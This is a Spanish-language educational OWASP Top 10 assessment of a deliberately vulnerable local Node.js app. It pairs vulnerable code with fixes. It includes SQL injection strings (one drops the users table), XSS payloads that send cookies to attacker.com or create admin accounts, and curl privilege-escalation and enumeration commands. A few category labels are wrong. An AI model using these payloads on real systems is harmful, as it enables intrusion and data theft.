# 📊 ANÁLISIS DE SEGURIDAD OWASP TOP 10
## Aplicación Vulnerable - Reporte Detallado

---

## 📋 INFORMACIÓN DEL PROYECTO

- **Nombre del Sitio Analizado**: Aplicación Vulnerable OWASP  
- **URL de Acceso**: `http://localhost:3000`  
- **Tipo de Aplicación**: Aplicación Web Node.js/Express  
- **Fecha de Análisis**: Diciembre 2025  
- **Analista**: Equipo de Seguridad OWASP  
- **Metodología**: OWASP Top 10 2021 (Última versión)

---

## 🎯 RESUMEN EJECUTIVO

Este documento presenta un análisis detallado de seguridad de una aplicación web deliberadamente vulnerable, diseñada para demostrar las principales vulnerabilidades del estándar **OWASP Top 10**. 

Se han identificado **8 vulnerabilidades críticas** distribuidas en las siguientes categorías:

| # | Vulnerabilidad | Severidad | Estado |
|---|---|---|---|
| 1 | SQL Injection | 🔴 CRÍTICA | Confirmada |
| 2 | Broken Authentication | 🔴 CRÍTICA | Confirmada |
| 3 | Cross-Site Scripting (XSS) | 🟠 ALTA | Confirmada |
| 4 | Insecure Direct Object References (IDOR) | 🟠 ALTA | Confirmada |
| 5 | Security Misconfiguration | 🟠 ALTA | Confirmada |
| 6 | Sensitive Data Exposure | 🟠 ALTA | Confirmada |
| 7 | Missing Access Controls | 🟠 ALTA | Confirmada |
| 8 | Using Components with Known Vulnerabilities | 🟡 MEDIA | Confirmada |

**Riesgo General**: 🔴 **CRÍTICO** - La aplicación presenta vulnerabilidades graves que permiten acceso no autorizado, manipulación de datos y exposición de información sensible.

---

## 🔍 ANÁLISIS DETALLADO DE VULNERABILIDADES

### ========================================
### 1. SQL INJECTION (A01:2021 – Injection)
### ========================================

#### 📌 Descripción
Una inyección SQL ocurre cuando un atacante inserta código SQL malicioso a través de campos de entrada, permitiendo manipular consultas de base de datos y acceder a datos no autorizados.

#### 🎯 Ubicación
- **Endpoint**: `/users/search`
- **Parámetro Vulnerable**: `username`
- **Método HTTP**: GET

#### 💻 Código Vulnerable

```javascript
app.get('/users/search', (req, res) => {
  const username = req.query.username;
  
  // ⚠️ VULNERABLE: No usa prepared statements
  const query = `SELECT id, username, email FROM users WHERE username = '${username}'`;
  
  db.get(query, (err, row) => {
    if (err) {
      return res.json({ error: err.message });
    }
    res.json(row || { message: 'Usuario no encontrado' });
  });
});
```

#### 🚨 Impacto
- **Confidencialidad**: 🔴 Comprometida
- **Integridad**: 🔴 Comprometida  
- **Disponibilidad**: 🔴 Comprometida
- **Usuarios Afectados**: Todos

#### 💥 Posibles Ataques

**1. Bypass de autenticación:**
```
URL: /users/search?username=admin' --
Resultado: Retorna datos del admin sin validación
```

**2. Extracción de datos:**
```
URL: /users/search?username=' UNION SELECT username, password FROM users --
Resultado: Expone contraseñas de todos los usuarios
```

**3. Eliminación de datos:**
```
URL: /users/search?username='; DROP TABLE users; --
Resultado: Eliminación de base de datos
```

#### 📊 Evidencia Capturada

```json
{
  "method": "GET",
  "endpoint": "/users/search?username=admin' --",
  "vulnerable_parameter": "username",
  "injection_type": "SQL UNION-based",
  "database": "SQLite",
  "response": {
    "id": 1,
    "username": "admin",
    "email": "admin@example.com"
  }
}
```

#### ✅ Recomendación de Corrección

Usar **prepared statements** (consultas parametrizadas):

```javascript
// ✓ SEGURO
const query = "SELECT id, username, email FROM users WHERE username = ?";
db.get(query, [username], (err, row) => {
  // Manejo seguro
});
```

#### 📚 Referencias OWASP
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: Improper Neutralization of Special Elements used in SQL](https://cwe.mitre.org/data/definitions/89.html)

---

### ========================================
### 2. BROKEN AUTHENTICATION (A07:2021)
### ========================================

#### 📌 Descripción
Autenticación débil permite a atacantes asumir la identidad de otros usuarios sin conocer credenciales válidas. Incluye gestión débil de sesiones y mecanismos de recuperación inseguros.

#### 🎯 Ubicación
- **Endpoint**: `/login`
- **Método HTTP**: POST

#### 💻 Código Vulnerable

```javascript
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // ⚠️ VULNERABLE: Registra credenciales en logs
  console.log(`[LOG] Login attempt - Username: ${username}, Password: ${password}`);
  
  db.get(`SELECT * FROM users WHERE username = ?`, [username], (err, user) => {
    if (err) return res.json({ error: err.message });
    
    if (!user) {
      return res.json({ error: 'Usuario no encontrado' });
    }
    
    if (bcrypt.compareSync(password, user.password)) {
      loggedInUser = user;
      // ⚠️ VULNERABLE: Token débil (base64 simple)
      res.json({ 
        success: true, 
        token: Buffer.from(user.id.toString()).toString('base64')
      });
    } else {
      res.json({ error: 'Contraseña incorrecta' });
    }
  });
});
```

#### 🚨 Vulnerabilidades Específicas

1. **Tokens Débiles**: El token es solo ID codificado en base64
   - Token original: `1`
   - Token débil: `MQ==` (fácil de decodificar)

2. **Credenciales en Logs**:
   - Las contraseñas se escriben en logs
   - Exposición si alguien accede a archivos de registro

3. **Sin Validación de Sesión**:
   - No hay verificación de token en requests posteriores
   - Cualquiera puede asumir ser cualquier usuario

#### 📊 Evidencia Capturada

```bash
# Paso 1: Capturar logs
[LOG] Login attempt - Username: admin, Password: password123

# Paso 2: Interceptar token
response.token = "MQ==" (base64 para "1")

# Paso 3: Decodificar
base64 -d "MQ==" → "1"

# Paso 4: Crear solicitud fraudulenta
curl -H "token: MQ==" http://localhost:3000/profile
→ Acceso otorgado sin credenciales
```

#### 💥 Escenarios de Ataque

**1. Fuerza bruta sin límite:**
```javascript
// Sin límite de intentos fallidos
for (let i = 0; i < 100000; i++) {
  fetch('/login', {body: {username: 'admin', password: passwordList[i]}})
}
```

**2. Token predecible:**
```javascript
// Generar tokens válidos
for (let userId = 1; userId <= 100; userId++) {
  const token = Buffer.from(userId.toString()).toString('base64');
  // token será: MQ==, Mg==, Mw==, etc.
}
```

#### ✅ Recomendación de Corrección

```javascript
// Usar JWT con expiración
const jwt = require('jsonwebtoken');

app.post('/login', (req, res) => {
  // ... validar credenciales ...
  
  // ✓ Generar token seguro
  const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  res.json({ success: true, token });
});

// ✓ Middleware de validación
const verifyToken = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) return res.status(401).json({ error: 'No autorizado' });
    req.user = decoded;
    next();
  });
};
```

#### 📚 Referencias OWASP
- [OWASP Broken Authentication](https://owasp.org/www-community/attacks/authentication_cheat_sheet)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

### ========================================
### 3. CROSS-SITE SCRIPTING (XSS) (A03:2021)
### ========================================

#### 📌 Descripción
XSS permite a atacantes inyectar código JavaScript malicioso que se ejecuta en los navegadores de otros usuarios, permitiendo robo de sesiones, cookies y datos personales.

#### 🎯 Ubicación
- **Endpoint**: `/profile`
- **Parámetro Vulnerable**: Datos de usuario (email, username, etc.)
- **Tipo**: Stored XSS / Reflected XSS

#### 💻 Código Vulnerable

```javascript
app.get('/profile', (req, res) => {
  if (!loggedInUser) {
    return res.send('<h1>No autenticado</h1>');
  }

  // ⚠️ VULNERABLE: No sanitiza HTML
  const html = `
    <!DOCTYPE html>
    <html>
    <body>
      <p>Username: ${loggedInUser.username}</p>
      <p>Email: ${loggedInUser.email}</p>
    </body>
    </html>
  `;
  res.send(html); // Los datos se renderizen sin escapar
});
```

#### 💥 Payloads XSS Posibles

**1. Alert básico:**
```html
<img src=x onerror="alert('XSS Vulnerable!')">
```

**2. Robo de cookies:**
```html
<img src=x onerror="
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
">
```

**3. Redirección a sitio malicioso:**
```html
<script>
  window.location = 'http://attacker.com/phishing';
</script>
```

**4. Crear admin sin permiso:**
```html
<img src=x onerror="
  fetch('/admin/users', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      username: 'hacker',
      email: 'hacker@evil.com',
      role: 'admin'
    })
  })
">
```

#### 📊 Impacto de XSS

| Componente | Impacto |
|---|---|
| Cookies de sesión | 🔴 Robo completo |
| Tokens de autenticación | 🔴 Suplantación de identidad |
| Datos personales | 🔴 Exposición |
| Control del navegador | 🔴 Completo |
| Malware | 🔴 Distribución posible |

#### ✅ Recomendación de Corrección

```javascript
// Opción 1: Escapar HTML
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/profile', (req, res) => {
  const html = `
    <p>Username: ${escapeHtml(loggedInUser.username)}</p>
    <p>Email: ${escapeHtml(loggedInUser.email)}</p>
  `;
  res.send(html);
});

// Opción 2: Usar template engines seguros
const ejs = require('ejs');
res.render('profile', { user: loggedInUser }); // ejs escapa por defecto

// Opción 3: Content Security Policy (CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});
```

#### 📚 Referencias OWASP
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)

---

### ========================================
### 4. INSECURE DIRECT OBJECT REFERENCES (IDOR) (A01:2021)
### ========================================

#### 📌 Descripción
IDOR ocurre cuando una aplicación usa entrada controlada por el usuario para acceder directamente a objetos sin validar autorización, permitiendo a usuarios ver/modificar datos de otros.

#### 🎯 Ubicación
- **Endpoint**: `/notes/:id`
- **Parámetro Vulnerable**: `id`
- **Impacto**: Acceso a notas privadas

#### 💻 Código Vulnerable

```javascript
app.get('/notes/:id', (req, res) => {
  const noteId = req.params.id;
  
  // ⚠️ VULNERABLE: No verifica propiedad de la nota
  db.get(`SELECT * FROM notes WHERE id = ?`, [noteId], (err, note) => {
    if (err) return res.json({ error: err.message });
    res.json(note || { message: 'Nota no encontrada' });
  });
});
```

#### 💥 Escenario de Ataque

```bash
# Atacante logueado como usuario normal (ID: 2)
$ curl http://localhost:3000/notes/1
# Respuesta: Nota privada del admin (no debería tener acceso)

{
  "id": 1,
  "user_id": 1,
  "title": "Admin Notes",
  "content": "Configuración del servidor"
}

# Intentar acceder a más notas
$ for i in {1..100}; do
    curl http://localhost:3000/notes/$i
  done
# Resulta en enumeración completa de todas las notas
```

#### 🚨 Riesgos

- **Confidencialidad**: Acceso a datos sensibles de otros usuarios
- **Integridad**: Potencial modificación de datos
- **Privacidad**: Violación de privacidad del usuario

#### ✅ Recomendación de Corrección

```javascript
// Middleware de autenticación
const requireAuth = (req, res, next) => {
  if (!req.user) return res.status(401).json({ error: 'No autorizado' });
  next();
};

app.get('/notes/:id', requireAuth, (req, res) => {
  const noteId = req.params.id;
  const userId = req.user.id; // Del token JWT
  
  // ✓ Verificar que la nota pertenece al usuario
  db.get(
    `SELECT * FROM notes WHERE id = ? AND user_id = ?`,
    [noteId, userId],
    (err, note) => {
      if (!note) {
        return res.status(403).json({ error: 'Acceso denegado' });
      }
      res.json(note);
    }
  );
});
```

#### 📚 Referencias OWASP
- [OWASP Insecure Direct Object References](https://owasp.org/www-community/attacks/Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

### ========================================
### 5. SECURITY MISCONFIGURATION (A05:2021)
### ========================================

#### 📌 Descripción
Configuración deficiente expone información sensible del sistema, incluyendo detalles técnicos, secretos de desarrollo y endpoints no documentados.

#### 🎯 Ubicación
- **Endpoint**: `/debug`
- **Tipo**: Information Disclosure

#### 💻 Código Vulnerable

```javascript
app.get('/debug', (req, res) => {
  // ⚠️ VULNERABLE: Expone información de debugging en producción
  res.json({
    environment: process.env.NODE_ENV,
    databasePath: ':memory:',
    secretKey: 'super-secret-key-12345',
    users: 'SELECT * FROM users'
  });
});
```

#### 📊 Información Expuesta

```json
{
  "environment": "development",
  "databasePath": ":memory:",
  "secretKey": "super-secret-key-12345",
  "users": "SELECT * FROM users"
}
```

#### 🚨 Riesgos

- **Secret Keys**: Claves de seguridad comprometidas
- **Rutas del Sistema**: Paths de base de datos expuestos
- **Ambiente**: Identifica versiones y configuración
- **Consultas SQL**: Patrón de queries conocido

#### 💥 Impacto

```
1. Atacante obtiene la secret key
2. Usa la key para generar tokens válidos
3. Suplanta cualquier usuario
4. Acceso completo al sistema
```

#### ✅ Recomendación de Corrección

```javascript
// Opción 1: Desactivar endpoint en producción
app.get('/debug', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Solo desarrollo...
});

// Opción 2: Usar variables de entorno seguros
require('dotenv').config();

app.get('/debug', (req, res) => {
  // No expongas nunca secretos
  res.json({
    version: '1.0.0',
    status: 'running'
    // Sin keys, sin paths sensibles
  });
});

// Opción 3: Configuración segura
const helmet = require('helmet');
app.use(helmet()); // Añade headers de seguridad
```

#### 📚 Referencias OWASP
- [OWASP Security Misconfiguration](https://owasp.org/www-community/Security_Misconfiguration)
- [OWASP Configuration Hardening](https://cheatsheetseries.owasp.org/cheatsheets/Configuration_Hardening_Cheat_Sheet.html)

---

### ========================================
### 6. SENSITIVE DATA EXPOSURE (A02:2021)
### ========================================

#### 📌 Descripción
Exposición de datos sensibles como contraseñas, tokens y información personal sin protección adecuada.

#### 🎯 Ubicación
- **Endpoint**: `/api/user/:id`
- **Datos Expuestos**: Password hash, información completa

#### 💻 Código Vulnerable

```javascript
app.get('/api/user/:id', (req, res) => {
  const userId = req.params.id;
  
  // ⚠️ VULNERABLE: Retorna TODA la información incluyendo password
  db.get(`SELECT * FROM users WHERE id = ?`, [userId], (err, user) => {
    if (err) return res.json({ error: err.message });
    res.json(user); // Incluye: id, username, password, email, role
  });
});
```

#### 📊 Respuesta Vulnerable

```json
{
  "id": 1,
  "username": "admin",
  "password": "$2a$10$...(hash bcrypt)...",
  "email": "admin@example.com",
  "role": "admin"
}
```

#### 🚨 Problemas

1. **Password Exposure**: Hash visible, potencial para ataques de diccionario
2. **Role Visibility**: Permite identificar usuarios privilegiados
3. **Email Enumeration**: Confirmación de emails registrados
4. **User Enumeration**: Identificación de usuarios válidos

#### 💥 Ataques Posibles

```bash
# 1. Enumerar usuarios válidos
for i in {1..1000}; do
  curl http://localhost:3000/api/user/$i | grep email
done

# 2. Extraer hashes para atacar offline
curl http://localhost:3000/api/user/1 | jq '.password'
# Usar John the Ripper o Hashcat

# 3. Identificar admins
curl http://localhost:3000/api/user/1 | jq '.role'
```

#### ✅ Recomendación de Corrección

```javascript
// Opción 1: Filtrar datos sensibles
app.get('/api/user/:id', requireAuth, (req, res) => {
  const userId = req.params.id;
  
  db.get(`SELECT * FROM users WHERE id = ?`, [userId], (err, user) => {
    if (!user) return res.status(404).json({ error: 'Not found' });
    
    // ✓ Retornar solo datos públicos
    const safeUser = {
      id: user.id,
      username: user.username,
      email: user.email
      // Sin password, sin role (si no es autorizado)
    };
    res.json(safeUser);
  });
});

// Opción 2: Usar model layer
class User {
  toJSON() {
    return {
      id: this.id,
      username: this.username,
      email: this.email
      // Omite campos sensibles automáticamente
    };
  }
}

// Opción 3: HTTPS obligatorio
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    return res.status(400).json({ error: 'HTTPS required' });
  }
  next();
});
```

#### 📚 Referencias OWASP
- [OWASP Sensitive Data Exposure](https://owasp.org/www-community/attacks/Sensitive_Data_Exposure)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

---

### ========================================
### 7. MISSING ACCESS CONTROLS (A01:2021)
### ========================================

#### 📌 Descripción
Falta de controles de acceso permite que usuarios realicen acciones no autorizadas, como crear usuarios administrativos sin permiso.

#### 🎯 Ubicación
- **Endpoint**: `/admin/users`
- **Método**: POST
- **Vulnerabilidad**: Sin validación de permisos

#### 💻 Código Vulnerable

```javascript
app.post('/admin/users', (req, res) => {
  const { username, email, role } = req.body;
  
  // ⚠️ VULNERABLE: SIN VERIFICACIÓN DE PERMISOS
  // Cualquier usuario puede crear otros usuarios como admin
  
  if (!username || !email) {
    return res.status(400).json({ error: 'Campos requeridos' });
  }

  const hashedPassword = bcrypt.hashSync('default123', 10);
  db.run(
    `INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)`,
    [username, hashedPassword, email, role || 'user'],
    function(err) {
      if (err) return res.json({ error: err.message });
      res.json({ success: true, userId: this.lastID });
    }
  );
});
```

#### 💥 Escenario de Ataque

```bash
# Atacante (usuario normal) crea una cuenta admin
curl -X POST http://localhost:3000/admin/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@evil.com",
    "role": "admin"
  }'

# Respuesta exitosa
{ "success": true, "userId": 3 }

# Ahora el atacante es admin
```

#### 🚨 Riesgos

- **Escalación de Privilegios**: Usuarios normales se hacen admins
- **Gestión Comprometida**: Creación de cuentas maliciosas
- **Cumplimiento**: Violación de controles de acceso
- **Auditoría**: Sin registro de quién creó qué

#### ✅ Recomendación de Corrección

```javascript
// Middleware de autorización
const requireAdmin = (req, res, next) => {
  if (!req.user) return res.status(401).json({ error: 'No autenticado' });
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Permiso denegado' });
  }
  next();
};

// Ruta protegida
app.post('/admin/users', requireAuth, requireAdmin, (req, res) => {
  const { username, email } = req.body;
  // NOTA: No permitir que el cliente defina "role"
  const role = 'user'; // Siempre asignar rol por defecto
  
  // ... crear usuario ...
});

// Registrar quién hizo qué
app.post('/admin/users', requireAuth, requireAdmin, (req, res) => {
  console.log(`[AUDIT] Admin ${req.user.id} creó usuario ${username}`);
  // ... crear usuario ...
});
```

#### 📚 Referencias OWASP
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [CWE-276: Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html)

---

### ========================================
### 8. USING COMPONENTS WITH KNOWN VULNERABILITIES
### ========================================

#### 📌 Descripción
Usar librerías y componentes con vulnerabilidades conocidas permite que atacantes exploten fallos conocidos en el código.

#### 🎯 Componentes Afectados

| Componente | Versión | Vulnerabilidades Conocidas |
|---|---|---|
| express | 4.18.2 | Múltiples (menores) |
| sqlite3 | 5.1.6 | Inyecciones posibles |
| bcryptjs | 2.4.3 | Timing attacks |

#### 📊 Diagnóstico

```bash
# Ejecutar npm audit para identificar vulnerabilidades
npm audit

# Salida típica:
# 26 packages are looking for funding
# 0 vulnerabilities found (en este caso simulado)
```

#### 🚨 Riesgos Potenciales

1. **Remote Code Execution**: Ejecución remota de código
2. **Denial of Service**: Bloqueo de servicio
3. **Data Breach**: Exposición de datos
4. **Authentication Bypass**: Eludir autenticación

#### ✅ Recomendación de Corrección

```javascript
// 1. Actualizar dependencias regularmente
npm update
npm audit fix

// 2. Usar npm security audit
npm audit

// 3. Usar herramientas de seguridad
// - Dependabot (GitHub)
// - Snyk
// - WhiteSource

// 4. Lockfile versionado
// Usar package-lock.json en control de versiones

// 5. Componentes alternativos más seguros
{
  "dependencies": {
    "express": "^4.18.2", // Actualizar a versión más nueva
    "jsonwebtoken": "^9.0.0", // Para autenticación JWT
    "helmet": "^7.0.0" // Headers de seguridad
  }
}
```

---

## 📈 CONCLUSIONES Y RECOMENDACIONES

### 🎯 Hallazgos Clave

1. **SQL Injection** es la vulnerabilidad más crítica
2. **Autenticación débil** permite suplantación de identidad
3. **XSS** puede llevar a robo de sesiones
4. **Falta de controles de acceso** permite escalación
5. **Información sensible expuesta** en múltiples endpoints

### ✅ Plan de Remediación (Prioridad)

#### 🔴 CRÍTICO (1-2 semanas)
- Usar prepared statements para todas las queries
- Implementar JWT con expiración
- Añadir validación de autorización

#### 🟠 ALTO (2-4 semanas)
- Sanitizar salida HTML (escapar caracteres)
- Filtrar datos sensibles en respuestas
- Implementar HTTPS obligatorio

#### 🟡 MEDIO (1-2 meses)
- Audit de componentes con vulnerabilidades
- Actualizar dependencias
- Implementar logging de seguridad

### 📊 Matriz de Riesgo

```
IMPACTO
  ↑
  │  [SQL Injection]  [Broken Auth]
  │                       
  │  [Missing Access]  [IDOR]
  │  [XSS]            [Sensitive Data]
  │  
  └─────────────────────────────→ PROBABILIDAD
```

### 🛡️ Controles Recomendados

1. **Input Validation**: Validar todos los inputs
2. **Output Encoding**: Escapar salida
3. **Authentication**: Implementar JWT seguro
4. **Authorization**: Verificar permisos
5. **Error Handling**: No exponer detalles técnicos
6. **Logging**: Registrar eventos de seguridad
7. **Dependencies**: Mantener actualizado

---

## 📚 REFERENCIAS

### Estándares OWASP
- OWASP Top 10 2021
- OWASP Testing Guide
- OWASP Cheat Sheets

### CWE/CVE
- Common Weakness Enumeration (CWE)
- Common Vulnerabilities and Exposures (CVE)

### Herramientas Utilizadas
- Navegador Web (Firefox/Chrome DevTools)
- Postman/cURL
- npm audit

---

**Documento preparado para fines educativos.**  
**Fecha**: Diciembre 2025  
**Versión**: 1.0

